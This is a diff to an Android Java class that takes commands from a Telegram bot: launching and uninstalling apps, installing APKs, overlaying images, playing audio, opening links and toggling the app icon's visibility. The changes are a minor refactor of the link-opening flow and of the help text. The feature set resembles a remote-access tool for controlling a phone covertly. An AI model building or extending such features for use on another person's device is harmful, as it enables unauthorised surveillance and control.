@@ -24,7 +24,7 @@ import java.util.List;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
-    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL }
+    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_LINK_OPEN }
     private WaitingState currentState = WaitingState.NONE;
     private int customDuration = 0;
     private int customScale = 100;
@@ -85,12 +85,12 @@ public class TelegramBotWorker implements Runnable {
                     sendMessage("Usage Access settings opened. Please enable permission for the app.", context);
                     break;
                 case "/open_link":
-                    if (parts.length > 1) openLink(parts[1]);
-                    else sendMessage("Usage: `/open_link <url>`", context);
+                    currentState = WaitingState.FOR_LINK_OPEN;
+                    sendMessage("Reply with the full URL to open (e.g., https://google.com)", context);
                     break;
                 case "/show_image":
-                    customDuration = 10; // Default duration
-                    customScale = 100; // Default scale
+                    customDuration = 10;
+                    customScale = 100;
                     if (parts.length > 2) {
                         try {
                             customDuration = Integer.parseInt(parts[1]);
@@ -101,7 +101,7 @@ public class TelegramBotWorker implements Runnable {
                     sendMessage("Ready for image file. It will be shown for " + customDuration + "s at " + customScale + "% scale.", context);
                     break;
                 case "/play_audio":
-                    customDuration = -1; // Default to full playback
+                    customDuration = -1;
                     if (parts.length > 1) {
                         if (!"full".equalsIgnoreCase(parts[1])) {
                             try { customDuration = Integer.parseInt(parts[1]); }
@@ -132,14 +132,28 @@ public class TelegramBotWorker implements Runnable {
 
     private boolean handleStatefulReply(String text) {
         WaitingState previousState = currentState;
-        currentState = WaitingState.NONE;
-        switch (previousState) {
-            case FOR_PACKAGE_NAME_LAUNCH: launchApp(text); return true;
-            case FOR_PACKAGE_NAME_UNINSTALL: uninstallApp(text); return true;
-            case FOR_VOLUME: setVolume(text); return true;
-            case FOR_LINK_OPEN: openLink(text); return true;
-            default: currentState = previousState; return false;
+        if (previousState == WaitingState.NONE) {
+            return false;
         }
+        
+        currentState = WaitingState.NONE;
+
+        if (previousState == WaitingState.FOR_PACKAGE_NAME_LAUNCH) {
+            launchApp(text);
+            return true;
+        } else if (previousState == WaitingState.FOR_PACKAGE_NAME_UNINSTALL) {
+            uninstallApp(text);
+            return true;
+        } else if (previousState == WaitingState.FOR_VOLUME) {
+            setVolume(text);
+            return true;
+        } else if (previousState == WaitingState.FOR_LINK_OPEN) {
+            openLink(text);
+            return true;
+        }
+
+        currentState = previousState;
+        return false;
     }
     
     private void handleFileUpload(JSONObject msg) {
@@ -247,7 +261,7 @@ public class TelegramBotWorker implements Runnable {
         Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(intent);
-        sendMessage("Uninstall requested for " + packageName + ". User confirmation is required.", context);
+        sendMessage("Uninstall requested for " + packageName + ". User confirmation may be required.", context);
     }
     
     private void installApp(String apkPath) {
@@ -292,8 +306,8 @@ public class TelegramBotWorker implements Runnable {
                 + "`/toggle_app_show` - Show app icon.\n"
                 + "`/grant_usage_access` - Open Usage Access settings.\n"
                 + "`/open_link <url>` - Open a link in Chrome.\n"
-                + "`/show_image <dur> <scale>` - Prompt for image upload.\n"
-                + "`/play_audio <dur|full>` - Prompt for audio upload.\n"
+                + "`/show_image [dur] [scale]` - Prompt for image upload.\n"
+                + "`/play_audio [dur|full]` - Prompt for audio upload.\n"
                 + "`/help` - Show this message.", context);
     }
 
